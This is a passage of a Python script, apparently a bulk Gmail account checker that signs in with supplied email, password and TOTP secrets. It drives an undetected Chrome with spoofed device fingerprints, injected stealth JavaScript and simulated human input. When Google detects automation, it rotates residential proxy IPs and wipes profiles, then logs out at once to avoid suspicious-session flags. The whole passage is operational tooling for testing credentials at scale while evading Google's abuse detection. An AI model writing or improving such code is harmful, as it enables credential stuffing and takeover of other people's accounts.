        # Strip spaces and uppercase (Google Authenticator shows keys with spaces)
        clean = secret.replace(" ", "").replace("\t", "").upper()
        return pyotp.TOTP(clean).now()
    except Exception as e:
        log(f"TOTP error: {e}")
        return None


def ensure_xvfb() -> str | None:
    """Start Xvfb on :99 if DISPLAY is not set. Returns display string or None."""
    display = os.environ.get("DISPLAY")
    if display:
        return display
    try:
        # Kill any stale Xvfb first
        subprocess.run(["pkill", "-f", "Xvfb :99"], capture_output=True)
        time.sleep(0.3)
        subprocess.Popen(
            ["Xvfb", ":99", "-screen", "0", "1366x768x24", "-ac"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(1.0)
        os.environ["DISPLAY"] = ":99"
        log("Xvfb started on :99")
        return ":99"
    except Exception as e:
        log(f"Xvfb unavailable: {e}")
        return None


# ── Main entry ────────────────────────────────────────────────────────────────

def main():
    try:
        raw = sys.stdin.read()
        data = json.loads(raw)
    except Exception as e:
        print(json.dumps({"status": "unknown", "reason": f"Bad input JSON: {e}", "totpCode": None}), flush=True)
        return

    email             = data.get("email", "")
    password          = data.get("password", "")
    totp_secret       = data.get("totp")
    proxy             = data.get("proxy")
    proxy_for_ip_check = data.get("proxyForIpCheck") or proxy  # original URL without sticky suffix
    fresh_profile     = bool(data.get("freshProfile", False))

    _t0 = time.time()
    result = check_gmail(email, password, totp_secret, proxy, fresh_profile, proxy_for_ip_check)

    # Auto-retry up to 3 times if Google blocked automation detection.
    # CRITICAL: each retry MUST use a NEW sticky session ID → different proxy IP.
    # Retrying with the same IP always fails again (IP is already flagged).
    import re as _re
    def _new_session_proxy(proxy_url: str | None) -> str | None:
        """Replace -session-XXXX in proxy username with a fresh random ID."""
        if not proxy_url:
            return proxy_url
        new_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
        replaced = _re.sub(r'-session-[a-z0-9]+', f'-session-{new_id}', proxy_url)
        if replaced == proxy_url:
            # No existing session tag — try to inject before the colon separator
            replaced = _re.sub(r'^(https?://[^:]+)', r'\1-session-' + new_id, proxy_url)
        return replaced

    _blocked_reason = result.get("reason", "")

    def _is_retriable(res: dict) -> bool:
        """Return True if the result is something we should auto-retry with a fresh proxy IP."""
        st  = res.get("status", "")
        rsn = res.get("reason", "").lower()
        # Automation blocks
        if st == "verification_required" and any(x in rsn for x in [
            "automation detected", "couldn't sign you in", "blocked this browser",
            "not be secure", "blocked", "rejected",
        ]):
            return True
        # Chrome crash / OOM / spawn failure — retry may succeed with fresh launch slot
        if st == "unknown" and any(x in rsn for x in [
            "chrome launch failed", "oom", "signal", "killed",
            "failed to spawn", "exit code", "timed out",
        ]):
            return True
        return False

    for _retry_n in range(3):
        if not _is_retriable(result):
            break
        _retry_proxy = _new_session_proxy(proxy)
        log(f"{email} — retriable result ({result.get('status')}) on attempt {_retry_n+1}/3, retrying with fresh profile + new proxy IP…")
        result = check_gmail(email, password, totp_secret, _retry_proxy, True, proxy_for_ip_check)
        _blocked_reason = result.get("reason", "")

    result["durationMs"] = int((time.time() - _t0) * 1000)
    log(f"{email} — Total duration: {result['durationMs']}ms ({result['durationMs']//1000}s)")
    print(json.dumps(result), flush=True)


# ── Browser check ─────────────────────────────────────────────────────────────

def check_gmail(email: str, password: str, totp_secret: str | None, proxy: str | None, fresh_profile: bool = False, proxy_for_ip_check: str | None = None) -> dict:
    totp_code = generate_totp(totp_secret) if totp_secret else None

    try:
        import undetected_chromedriver as uc
    except ImportError:
        return {
            "status": "unknown",
            "reason": "undetected-chromedriver not installed. Run: pip install -r requirements.txt",
            "totpCode": totp_code,
        }

    display = ensure_xvfb()
    headless = display is None
    chromium_path = get_chromium_path()
    log(f"Chromium: {chromium_path}, headless={headless}, display={display}")

    # Profile directory — wiped on fresh_profile=True so Google sees a brand-new device
    safe_email = email.replace("@", "_at_").replace(".", "_")
    profile_dir = os.path.join(tempfile.gettempdir(), "gmail_checker_profiles", safe_email)

    if fresh_profile and os.path.exists(profile_dir):
        import shutil
        try:
            shutil.rmtree(profile_dir)
            log(f"Fresh profile mode — wiped {profile_dir}")
        except Exception as e:
            log(f"Warning: could not wipe profile dir: {e}")

    os.makedirs(profile_dir, exist_ok=True)
    log(f"Chrome profile: {profile_dir} (fresh={fresh_profile})")

    # ── Load or generate unique fingerprint (fresh_profile → always new) ──────
    fp = get_or_create_fingerprint(profile_dir)
    fp_summary = (f"{fp['model']} | {fp['webglRenderer']} | "
                  f"{fp['screenW']}x{fp['screenH']} dpr={fp['dpr']} | canvas={fp['canvasSeed']}")
    log(f"Fingerprint: {fp_summary}")
    MOBILE_UA = (
        f"Mozilla/5.0 (Linux; Android {fp['androidVersion']}; {fp['model']}) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{fp['chromeVersion']} Mobile Safari/537.36"
    )

    options = uc.ChromeOptions()
    options.add_argument(f"--user-data-dir={profile_dir}")
    proxy_ext_path: str | None = None

    # Proxy configuration
    if proxy:
        proxy_info = parse_proxy(proxy)
        if proxy_info and proxy_info["host"]:
            log(f"Proxy: {proxy_info['host']}:{proxy_info['port']} user={proxy_info.get('username')}")
            if proxy_info.get("username") and not headless:
                proxy_ext_path = make_proxy_extension(
                    proxy_info["host"], proxy_info["port"],
                    proxy_info["username"], proxy_info.get("password") or ""
                )
                options.add_extension(proxy_ext_path)
                log("Proxy auth extension loaded")
            else:
                options.add_argument(
                    f'--proxy-server=http://{proxy_info["host"]}:{proxy_info["port"]}'
                )

    # Exit IP will be fetched from inside Chrome after launch (uses the same proxy Chrome uses).
    exit_ip: str | None = None

    # Chrome flags — use fingerprint dimensions/UA
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-setuid-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument(f"--window-size={fp['screenW']},{fp['screenH']}")
    options.add_argument("--lang=en-US,en")
    options.add_argument("--disable-notifications")
    options.add_argument("--disable-popup-blocking")
    options.add_argument("--disable-save-password-bubble")
    options.add_argument("--disable-translate")
    options.add_argument("--password-store=basic")
    options.add_argument("--no-first-run")
    options.add_argument("--no-default-browser-check")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--disable-features=ChromeWhatsNewUI,ChromeReporting,EnablePasswordsAccountStorage")
    options.add_argument(f"--user-agent={MOBILE_UA}")
    options.add_argument("--touch-events=enabled")
    # Match the fingerprint DPR so window.devicePixelRatio equals screen.dpr
    options.add_argument(f"--force-device-scale-factor={fp['dpr']}")
    # Use fingerprint language for Accept-Language Chrome header
    options.add_argument(f"--lang={fp.get('language', 'en-US')}")
    if headless:
        options.add_argument("--disable-gpu")

    log(f"Launching Chrome (UC)…")
    # Acquire cross-process lock so only ONE Chrome starts at a time.
    # Concurrent Chrome launches exhaust shared memory and cause crashes.
    _xvfb_proc = None  # private Xvfb for this account — killed in _cleanup()
    _lock_fd = open(_CHROME_LAUNCH_LOCK_PATH, "w")
    log("Waiting for Chrome launch slot…")
    fcntl.flock(_lock_fd, fcntl.LOCK_EX)
    log("Chrome launch slot acquired — starting Chrome")
    _cd_port = _find_free_port()
    log(f"ChromeDriver port: {_cd_port}")
    # Each account gets its OWN private Xvfb display so xdotool keystrokes
    # never cross-contaminate between concurrent Chrome windows.
    _disp_num = _find_free_display()
    try:
        _xvfb_proc = subprocess.Popen(
            ["Xvfb", f":{_disp_num}", "-screen", "0", "1366x768x24", "-ac"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        time.sleep(0.5)  # wait for Xvfb to be ready
        os.environ["DISPLAY"] = f":{_disp_num}"
        log(f"Private Xvfb on :{_disp_num} (pid={_xvfb_proc.pid})")
    except Exception as _xvfb_err:
        log(f"Private Xvfb failed (:{_disp_num}): {_xvfb_err} — using shared display")
        _xvfb_proc = None
    try:
        driver = uc.Chrome(
            options=options,
            browser_executable_path=chromium_path,
            headless=headless,
            version_main=138,
            use_subprocess=True,
            port=_cd_port,
        )
        # Hold lock briefly while Chrome stabilises, then release for next account
        time.sleep(2.5)
    except Exception as e:
        fcntl.flock(_lock_fd, fcntl.LOCK_UN)
        _lock_fd.close()
        _cleanup(proxy_ext_path, _xvfb_proc)
        return {
            "status": "unknown",
            "reason": f"Chrome launch failed: {str(e)[:300]}",
            "totpCode": totp_code,
            "exitIp": exit_ip,
            "fingerprint": fp_summary,
        }
    fcntl.flock(_lock_fd, fcntl.LOCK_UN)
    _lock_fd.close()
    log("Chrome launch slot released")

    log("Chrome launched")

    # Inject stealth patches on every new page (fingerprint-specific values)
    try:
        driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument",
                               {"source": make_stealth_js(fp)})
        log("Stealth JS injected via CDP")
    except Exception as e:
        log(f"Stealth JS warning: {e}")

    # Fix UA Client Hints in actual HTTP headers using fingerprint values
    try:
        driver.execute_cdp_cmd("Network.enable", {})
        driver.execute_cdp_cmd("Network.setUserAgentOverride", {
            "userAgent": MOBILE_UA,
            "acceptLanguage": f"{fp.get('language', 'en-US')},en;q=0.9",
            "platform": fp["platform"],
            "userAgentMetadata": {
                "brands": [
                    {"brand": "Not=A?Brand",   "version": "24"},
                    {"brand": "Chromium",       "version": "138"},
                    {"brand": "Google Chrome",  "version": "138"},
                ],
                "fullVersion": fp["chromeVersion"],
                "platform": "Android",
                "platformVersion": fp["androidVersion"],
                "architecture": "",
                "model": fp["model"],
                "mobile": True,
                "bitness": "",
                "wow64": False,
            },
        })
        log(f"Network UA override applied → {fp['model']} / Android {fp['androidVersion']}")
    except Exception as e:
        log(f"Network UA override warning: {e}")

    # Exit IP fetch skipped — each account uses a unique sticky session ID for IP isolation
    exit_ip = None

    _login_result: dict = {}
    try:
        _login_result = _do_login(driver, email, password, totp_code, totp_secret)
    except Exception as e:
        log(f"Login exception: {e}")
        _login_result = {"status": "unknown", "reason": f"Login error: {str(e)[:300]}", "totpCode": totp_code}
    finally:
        try:
            driver.quit()
        except Exception:
            pass
        _cleanup(proxy_ext_path, _xvfb_proc)
    _login_result["exitIp"] = exit_ip
    _login_result["fingerprint"] = fp_summary
    return _login_result


def _cleanup(path: str | None, xvfb_proc=None):
    if path and os.path.exists(path):
        try:
            os.unlink(path)
        except Exception:
            pass
    if xvfb_proc is not None:
        try:
            xvfb_proc.terminate()
            xvfb_proc.wait(timeout=3)
        except Exception:
            pass


# ── Login flow ────────────────────────────────────────────────────────────────

def _do_login(driver, email: str, password: str, totp_code: str | None, totp_secret: str | None = None) -> dict:
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys

    def page_state():
        url = driver.current_url
        try:
            text = driver.find_element(By.TAG_NAME, "body").text.lower()
        except Exception:
            text = ""
        return url, text

    def screenshot_b64() -> str | None:
        try:
            return f"data:image/jpeg;base64,{base64.b64encode(driver.get_screenshot_as_png()).decode()}"
        except Exception:
            return None

    def get_hostname(url: str) -> str:
        """Return the actual hostname from the URL (not query string)."""
        try:
            from urllib.parse import urlparse
            return urlparse(url).hostname or ""
        except Exception:
            return ""

    def classify(url: str, text: str) -> dict | None:
        host = get_hostname(url)
        # Must literally BE at mail.google.com — not just have it in a ?continue= param
        at_mailbox = host == "mail.google.com" or host.endswith(".mail.google.com")

        has_compose = False
        if at_mailbox:
            try:
                has_compose = len(driver.find_elements(By.CSS_SELECTOR,
                    '[gh="cm"],[data-tooltip="Compose"],[aria-label="Compose"]')) > 0
            except Exception:
                pass

        has_inbox_text = False
        if at_mailbox:
            has_inbox_text = (
                "compose" in text
                or ("inbox" in text and "sign in" not in text and "create an account" not in text)
                or ("primary" in text and at_mailbox)
            )

        if at_mailbox and (has_compose or has_inbox_text or "mail/u/" in url or "mail/mu/" in url or "/mail/mp/" in url):
            rand_sleep(500, 800)
            shot = screenshot_b64()
            # ── Logout immediately so Google doesn't flag a suspicious active session ──
            try:
                log("Mailbox opened — logging out to avoid suspicious-session flag")
                driver.get("https://accounts.google.com/Logout?continue=https://mail.google.com")
                rand_sleep(700, 1200)
                log("Logout complete")
            except Exception as _le:
                log(f"Logout warning (non-fatal): {_le}")
            return {
                "status": "opened",
                "reason": "Mailbox opened successfully ✅",
                "totpCode": totp_code,
                "debugScreenshot": shot,
            }

        # ── "This browser or app may not be secure" ──────────────────────────
        # Google blocks when it detects automation signals (UA-CH mismatch, etc.)
        # Clear the persistent profile so next attempt gets a fresh device identity.
        if (
            "couldn't sign you in" in text
            or "not be secure" in text
            or "browser or app may not" in text
            or "signin/blocked" in url
            or ("blocked" in url and "accounts.google.com" in url)
        ):
            shot = screenshot_b64()
            # Wipe the persistent profile — it may be tainted / flagged by Google
            try:
                import shutil
                _safe = email.replace("@", "_at_").replace(".", "_")
                _prof = os.path.join(tempfile.gettempdir(), "gmail_checker_profiles", _safe)
                if os.path.exists(_prof):
                    shutil.rmtree(_prof, ignore_errors=True)
                    log(f"Wiped stale Chrome profile: {_prof}")
            except Exception as _pe:
                log(f"Profile wipe warning: {_pe}")
            return {
                "status": "verification_required",
                "reason": (
                    "Google blocked this browser (automation detected). "
                    "Profile wiped — retry once to get a fresh device identity. "
                    "If persists, try a different proxy or wait 10-15 min."
                ),
                "totpCode": totp_code,
                "debugScreenshot": shot,
            }

        if any(x in text for x in [
            "couldn't find your google account", "no account found",
            "find your google account", "no google account found",
            "couldn't find an account", "email or phone number",
        ]):
            return {"status": "wrong_password", "reason": "Google account not found", "totpCode": totp_code}

        if any(x in text for x in [
            "wrong password", "didn't recognize", "password you entered",
            "incorrect password", "that password is incorrect",
            "the password you entered is incorrect",
            "the email or password you entered is incorrect",
            "password is wrong", "access was denied",
        ]) or any(x in url for x in ["WrongPassword", "wrongpassword"]):
            return {"status": "wrong_password", "reason": "Wrong password", "totpCode": totp_code}

        # "challenge/pwd" is the normal password page — do NOT flag it as verification
        # "challenge/dp"  is the device-protection / 2FA selection page — handle separately
        # "challenge/totp" / "challenge/ipp" are TOTP pages — handle separately
        _2fa_urls = ("challenge/dp", "challenge/totp", "challenge/ipp",
                     "challenge/selection", "challenge/sk")
        is_real_challenge = (
            (
                "challenge" in url
                and "challenge/pwd" not in url
                and not any(x in url for x in _2fa_urls)
            )
            or "InterstitialConfirmation" in url
            or ("verify" in url and "mail" not in url and "challenge/pwd" not in url)
        )
        # uplevelingstep = Google account upgrade prompt (not a real security block)
        is_uplevel = "uplevelingstep" in url
        if not is_uplevel and (any(x in text for x in [
            "verify your identity", "verify it's you", "choose a way to verify",
            "confirm it's you", "unusual activity", "suspicious activity",
            "protect your account"
        ]) or is_real_challenge):
            shot = screenshot_b64()
            return {
                "status": "verification_required",
                "reason": "Google is asking for phone/device verification",
                "totpCode": totp_code,
                "debugScreenshot": shot,
            }

        return None

    def wait_for_any(selectors: list[str], timeout: int = 12) -> object | None:
        """Wait for any of the CSS selectors and return the first visible element."""
        deadline = time.time() + timeout
        while time.time() < deadline:
            for sel in selectors:
                try:
                    el = driver.find_element(By.CSS_SELECTOR, sel)
                    if el.is_displayed():
                        return el
                except Exception:
                    pass
            time.sleep(0.15)
        return None

    # ── Step 0: Warmup — visit Google homepage first ─────────────────────────
    # CRITICAL: Without this, Google detects automation at the password step
    # and silently bounces back to challenge/pwd (no error message).
    # Root cause: fingerprint needs a real page load to "warm up" before
    # Google's login flow trusts the session. The warmup MUST:
    #   1. Wait for the page to be truly interactive (not just nav start)
    #   2. Do minimal human-like interaction (scroll)
    #   3. Sleep long enough for JS fingerprinting to execute over proxy
    # 800–1200ms was too short over proxy — page incomplete → Google detects
    # automation → bounces back to challenge/pwd → wrongly tagged wrong_password.
    try:
        log(f"{email} — Step 0: warmup visit to google.com")
        driver.get("https://www.google.com")
        # Wait for page to be fully interactive (document.readyState = complete)
        # Proxy latency means this can take 2–4s — don't skip ahead early.
        _w_deadline = time.time() + 6
        while time.time() < _w_deadline:
            try:
                if driver.execute_script("return document.readyState") == "complete":
                    break
            except Exception:
                pass
            time.sleep(0.35)
        # Simulate minimal human interaction: scroll down, pause, scroll back up
        try:
            driver.execute_script("window.scrollTo({top: 250, behavior: 'smooth'});")
            rand_sleep(300, 500)
            driver.execute_script("window.scrollTo({top: 0, behavior: 'smooth'});")
        except Exception:
            pass
        # Let JS fingerprint hooks execute fully before leaving the page
        rand_sleep(1000, 1500)
        log(f"{email} — Step 0: warmup complete")
    except Exception:
        pass  # warmup failure is non-fatal — continue anyway

    # ── Step 1: Navigate to Gmail sign-in ────────────────────────────────────
    log(f"{email} — Step 1: navigating to sign-in page")
    try:
        driver.get(
            "https://accounts.google.com/v3/signin/identifier"
            "?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F"
            "&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin"
        )
        rand_sleep(600, 1000)
    except Exception as e:
        return {"status": "unknown", "reason": f"Navigation failed: {str(e)[:200]}", "totpCode": totp_code}

    url, text = page_state()
    log(f"{email} — After nav: {url[:70]}")

    if "signin/rejected" in url:
        shot = screenshot_b64()
        return {
            "status": "verification_required",
            "reason": "Google rejected sign-in (automation detected). Use a residential proxy.",
            "totpCode": totp_code,
            "debugScreenshot": shot,
        }

    # Already-authenticated session in persistent profile — skip straight to Gmail
    # Do NOT fall through to Steps 2-4 (no email field on these pages)
    if "signin/continue" in url or "accounts.google.com/o/oauth2/auth" in url:
        log(f"{email} — Session still active (signin/continue), navigating to Gmail directly")
        try:
            driver.get("https://mail.google.com/mail/u/0/#inbox")
            rand_sleep(2500, 3500)
        except Exception:
            pass
        # Mini interstitial loop — dismiss recovery/uplevelingstep pages then land on Gmail
        _uplevel_hits = 0
        for _si in range(8):
            url, text = page_state()
            log(f"{email} — [shortcut loop {_si}] {url[:70]}")
            if "mail.google.com" in get_hostname(url):
                break
            result = classify(url, text)
            if result:
                return result
            _host = get_hostname(url)
            if "uplevelingstep" in url:
                _uplevel_hits += 1
                if _uplevel_hits == 1:
                    # Try "Not now" / "Skip" on any element including plain <a>
                    try:
                        driver.execute_script("""
                            var skip_texts=['not now','skip','later','no thanks','dismiss','cancel'];
                            var els=Array.from(document.querySelectorAll('button,a,[role="button"],[role="link"]'));
                            for(var t of skip_texts){
                                var f=els.find(b=>b.innerText&&b.innerText.trim().toLowerCase()===t);
                                if(f){f.click();return;}
                            }
                            // partial match
                            for(var t of skip_texts){
                                var f=els.find(b=>b.innerText&&b.innerText.trim().toLowerCase().indexOf(t)===0);
                                if(f){f.click();return;}
                            }
                        """)
                    except Exception:
                        pass
                elif _uplevel_hits == 2:
                    # Try Gmail HTML version
                    try:
                        driver.get("https://mail.google.com/mail/h/?zy=e")
                        rand_sleep(2000, 3000)
                        _hu = driver.current_url
                        if "mail.google.com" in get_hostname(_hu) and "uplevelingstep" not in _hu:
                            break  # HTML Gmail loaded — continue to classify below
                    except Exception:
                        pass
                else:
                    # uplevelingstep persists after multiple dismiss attempts →
                    # mandatory phone/QR verification that cannot be bypassed automatically
                    log(f"{email} — shortcut: uplevelingstep persists → verification_required")
                    shot = screenshot_b64()
                    return {
                        "status": "verification_required",
                        "reason": "Google requires phone or device verification to continue (cannot bypass automatically)",
                        "totpCode": totp_code,
                        "debugScreenshot": shot,
                    }
            elif "gds.google.com" in _host:
                try:
                    driver.execute_script("""
                        var skip_texts=['not now','skip','later','no thanks','dismiss','cancel'];
                        var btns=Array.from(document.querySelectorAll('button,a[role="button"]'));
                        for(var t of skip_texts){
                            var f=btns.find(b=>b.innerText&&b.innerText.trim().toLowerCase()===t);
                            if(f){f.click();return;}
                        }
                        if(btns.length>=2)btns[btns.length-2].click();
                    """)
                except Exception:
                    pass
            elif "signin/continue" in url:
                try:
                    driver.get("https://mail.google.com/mail/u/0/#inbox")
                except Exception:
                    pass
            else:
                try:
                    driver.execute_script("""
                        var btn=document.querySelector('button[type="submit"],#confirm,button');
                        if(btn)btn.click();
                    """)
                except Exception:
                    pass
            rand_sleep(2000, 3000)
        url, text = page_state()
        result = classify(url, text)
        if result:
            return result
        shot = screenshot_b64()
        return {
            "status": "unknown",
            "reason": f"Session active but Gmail not reached after interstitials: {url[:80]}",
            "totpCode": totp_code,
            "debugScreenshot": shot,
        }

    result = classify(url, text)
    if result:
        return result

    EMAIL_SELECTORS = [
        "#identifierId",
        'input[type="email"]',
        'input[name="identifier"]',
        'input[autocomplete="username"]',
        'input[name="Email"]',
    ]

    # ── Step 2: Enter email ───────────────────────────────────────────────────
    log(f"{email} — Step 2: typing email")
    email_field = wait_for_any(EMAIL_SELECTORS, timeout=8)

    if not email_field:
        url, text = page_state()
        result = classify(url, text)
        if result:
            return result
        shot = screenshot_b64()
        return {
            "status": "unknown",
            "reason": f"Email field not found. URL: {url[:80]}",
            "totpCode": totp_code,
            "debugScreenshot": shot,
        }

    # click with stale-element retry (proxy extension can cause brief page reload)
    for _attempt in range(3):
        try:
            natural_mouse_move(driver, email_field)
            rand_sleep(60, 130)
            email_field.click()
            break
        except Exception:
            rand_sleep(200, 400)
            email_field = wait_for_any(EMAIL_SELECTORS, timeout=6) or email_field

    rand_sleep(80, 160)
    clipboard_type(driver, email_field, email)   # instant paste — xdotool clipboard
    rand_sleep(100, 200)
    # Click the "Next" button — more human than Keys.ENTER (which is detectable as Selenium)
    _email_next = wait_for_any([
        '#identifierNext button', '#identifierNext', '[jsname="LgbsSe"]',
        'button[type="button"]', 'div[role="button"]',
    ], timeout=4)
    if _email_next:
        try:
            natural_mouse_move(driver, _email_next)
            rand_sleep(80, 150)
            _email_next.click()
        except Exception:
            email_field.send_keys(Keys.ENTER)
    else:
        email_field.send_keys(Keys.ENTER)

    # Wait for URL to advance past the email page (proxy latency can be 2-4s).
    # Poll until URL changes or timeout — more reliable than a fixed sleep.
    _pre_email_url = driver.current_url
    _nav_deadline = time.time() + 8
    while time.time() < _nav_deadline:
        try:
            _cur = driver.current_url
            if _cur != _pre_email_url and "signin/identifier" not in _cur:
                break
        except Exception:
            pass
        time.sleep(0.25)
    rand_sleep(300, 600)  # small extra settle after URL change

    url, text = page_state()
    log(f"{email} — After email submit: {url[:70]}")

    # ── Identifier-page stall fix (Session 8) ────────────────────────────────
    # If Google never navigated past the email page, the proxy IP was detected
    # at the email step (silent CAPTCHA or block). Falls to unknown otherwise.
    # Classify as verification_required so auto-retry fires with a fresh proxy IP.
    if ("signin/identifier" in url) and "challenge" not in url and "mail.google.com" not in url:
        shot = screenshot_b64()
        log(f"{email} — Identifier stall: page did not advance past email field (automation detected at email step)")
        return {
            "status": "verification_required",
            "reason": "automation detected at email step — page did not advance past email field. Auto-retrying with fresh proxy IP.",
            "totpCode": totp_code,
            "debugScreenshot": shot,
        }

    if "signin/rejected" in url:
        shot = screenshot_b64()
        return {
            "status": "verification_required",
            "reason": "Google rejected sign-in (automation detected). Use a residential proxy.",
            "totpCode": totp_code,
            "debugScreenshot": shot,
        }

    # uplevelingstep after email = stale session cookies — dismiss and continue
    if "uplevelingstep" in url:
        log(f"{email} — uplevelingstep after email submit, dismissing and continuing")
        for _ui in range(4):
            try:
                driver.execute_script("""
                    var skip_texts=['not now','skip','later','no thanks','dismiss','cancel'];
                    var btns=Array.from(document.querySelectorAll('button,a[role="button"]'));
                    for(var t of skip_texts){
                        var f=btns.find(b=>b.innerText&&b.innerText.trim().toLowerCase()===t);
                        if(f){f.click();return 'clicked:'+t;}
                    }
                    if(btns.length>=2)btns[btns.length-2].click();
                """)
            except Exception:
                pass
            rand_sleep(700, 1200)
            url, text = page_state()
            if "uplevelingstep" not in url:
                break

    result = classify(url, text)
    if result:
        return result

    PW_SELECTORS = [
        'input[name="Passwd"]',
        'input[type="password"]:not([name="hiddenPassword"])',
        'input[name="password"]',
        '#password input',
    ]

    # ── Step 3: Enter password ────────────────────────────────────────────────
    log(f"{email} — Step 3: typing password")
    pw_field = wait_for_any(PW_SELECTORS, timeout=8)

    if not pw_field:
        url, text = page_state()
        result = classify(url, text)
        if result:
            return result
        shot = screenshot_b64()
        return {
            "status": "unknown",
            "reason": f"Password field not found. URL: {url[:80]}",
            "totpCode": totp_code,
            "debugScreenshot": shot,
        }

    natural_mouse_move(driver, pw_field)
    rand_sleep(60, 130)
    pw_field.click()
    rand_sleep(80, 160)
    clipboard_type(driver, pw_field, password)   # instant paste — xdotool clipboard
    rand_sleep(100, 180)
    # Click the "Next" button — more human than Keys.ENTER (detectable as Selenium)
    _pw_next = wait_for_any([
        '#passwordNext button', '#passwordNext', '[jsname="LgbsSe"]',
        'button[type="button"]', 'div[role="button"]',
    ], timeout=4)
    if _pw_next:
        try:
            natural_mouse_move(driver, _pw_next)
            rand_sleep(80, 160)
            _pw_next.click()
        except Exception:
            pw_field.send_keys(Keys.ENTER)
    else:
        pw_field.send_keys(Keys.ENTER)

    # Wait for URL to advance past the password page (proxy latency can be 2-4s).
    # Polling is more reliable than a fixed sleep — catches fast AND slow responses.
    _pre_pwd_url = driver.current_url
    _nav_deadline = time.time() + 10
    while time.time() < _nav_deadline:
        try:
            _cur = driver.current_url
            if _cur != _pre_pwd_url and "challenge/pwd" not in _cur:
                break
        except Exception:
            pass
        time.sleep(0.25)
    rand_sleep(300, 600)  # extra settle after URL change

    url, text = page_state()
    log(f"{email} — After password submit: {url[:70]}")

    # ── Quick wrong-password check (before anything else) ─────────────────────
    if any(x in text for x in [
        "wrong password", "didn't recognize", "that password is incorrect",
        "incorrect password", "password you entered"
    ]) or any(x in url for x in ["WrongPassword", "wrongpassword"]):
        return {"status": "wrong_password", "reason": "Wrong password", "totpCode": totp_code}

    # If Google returned us BACK to the password page WITHOUT an error message
    # → this is automation detection, NOT a wrong password.
    # Google silently reloads challenge/pwd when it suspects a bot.
    # Classify as verification_required so auto-retry fires with fresh profile.
    if "challenge/pwd" in url or "ServicePasswordChallenge" in url:
        shot = screenshot_b64()
        return {
            "status": "verification_required",
            "reason": (
                "Google silently bounced back to password page (automation detected). "
                "Profile wiped — auto-retrying with fresh fingerprint."
            ),
            "totpCode": totp_code,
            "debugScreenshot": shot,
        }

    # ── Step 4: 2FA — check BEFORE classify so we handle it ourselves ─────────

    # Broad TOTP input selectors — used in multiple places below.
    # Covers all known Google Authenticator input variants across UI versions.
    TOTP_SELECTORS = [
        'input[name="totpPin"]', 'input[name="Pin"]', 'input[id="totpPin"]',
        'input[autocomplete="one-time-code"]', 'input[type="tel"]',
        'input[aria-label*="code"]', 'input[aria-label*="Code"]',
        'input[placeholder*="code"]', 'input[placeholder*="Code"]',
        'input[type="number"]',
    ]

    # True when Google has already landed on the TOTP input page directly
    # (e.g. "Verify that it's you — Get a verification code from Google Authenticator")
    # URL: challenge/totp or challenge/ipp — the input field is already rendered.
    _on_totp_url = "challenge/totp" in url or "challenge/ipp" in url

    # Detect direct TOTP-input page (input already visible).
    # If we know we're on a TOTP URL, wait briefly for the field — single
    # find_element with no wait misses the field when the page is still rendering.
    totp_field = None
    if _on_totp_url:
        totp_field = wait_for_any(TOTP_SELECTORS, timeout=8)
        log(f"{email} — TOTP URL detected ({url[:60]}), field={'found' if totp_field else 'not yet visible'}")
    else:
        try:
            totp_field = driver.find_element(By.CSS_SELECTOR,
                'input[name="totpPin"],input[name="Pin"],input[id="totpPin"],'
                'input[autocomplete="one-time-code"],input[aria-label*="code"],'
                'input[placeholder*="code"],input[placeholder*="Code"]')
        except Exception:
            pass

    # Detect method-selection page ("2-Step Verification — choose how you want")
    # Also trigger on URL: challenge/dp = device-protection 2FA selection,
    # challenge/selection = explicit 2FA method picker.
    # challenge/totp / challenge/ipp = already on TOTP input page (handle separately below).
    # Text: "verify that it's you" is the page heading for the Google Authenticator
    # challenge page — distinct from "verify it's you" (method-selection heading).
    is_2fa_select = (
        any(x in text for x in [
            "2-step verification",
            "choose how you want to sign in",
            "how do you want to sign in",
            "verify it's you",
            "verify that it's you",  # Google Authenticator challenge heading
        ])
        or "challenge/dp" in url
        or "challenge/selection" in url
        or _on_totp_url  # already on TOTP input page — treat as 2FA page
    )

    if is_2fa_select and totp_field is None:
        log(f"{email} — 2FA page detected (url={url[:60]})")
        if not totp_code:
            shot = screenshot_b64()
            return {
                "status": "2fa_required",
                "reason": "2FA required — add TOTP secret as 3rd field: email:password:totp_secret",
                "totpCode": None,
                "debugScreenshot": shot,
            }

        if _on_totp_url:
            # Already on the TOTP input page (challenge/totp or challenge/ipp).
            # Do NOT click Authenticator — just wait longer for the input field.
            log(f"{email} — Already on TOTP input page, waiting for field to render…")
            totp_field = wait_for_any(TOTP_SELECTORS, timeout=15)
            if totp_field is None:
                log(f"{email} — TOTP field still not found on challenge/totp page after 15s wait")
        else:
            # Method-selection page — click the Google Authenticator option.
            log(f"{email} — Clicking 'Google Authenticator' option")

            def _click_authenticator():
                try:
                    driver.execute_script("""
                        // Try by data-challengetype (totp = 6)
                        var byType = document.querySelector('[data-challengetype="6"]');
                        if (byType) { byType.click(); return; }
                        // Try by visible text containing "authenticator"
                        var allEls = Array.from(document.querySelectorAll(
                            'li, div[role="listitem"], [data-challengetype]'));
                        var found = allEls.find(function(el) {
                            return el.innerText && el.innerText.toLowerCase().indexOf('authenticator') !== -1;
                        });
                        if (found) { found.click(); return; }
                        // Broader fallback — any clickable element with the word
                        var broader = Array.from(document.querySelectorAll('*')).find(function(el) {
                            return el.children.length === 0
                                && el.innerText
                                && el.innerText.toLowerCase().indexOf('authenticator') !== -1;
                        });
                        if (broader) broader.click();
                    """)
                except Exception as e:
                    log(f"Authenticator click error: {e}")

            _click_authenticator()
            rand_sleep(700, 1100)

            # Wait for the TOTP input to appear (longer timeout — SPA navigation on dp page)
            totp_field = wait_for_any(TOTP_SELECTORS, timeout=18)

            # Fallback: try "Try another way" → then click authenticator again
            if totp_field is None:
                log(f"{email} — TOTP not found after first click, trying 'Try another way'")
                try:
                    driver.execute_script("""
                        var links = Array.from(document.querySelectorAll('a, button, [role="button"]'));
                        var found = links.find(function(el) {
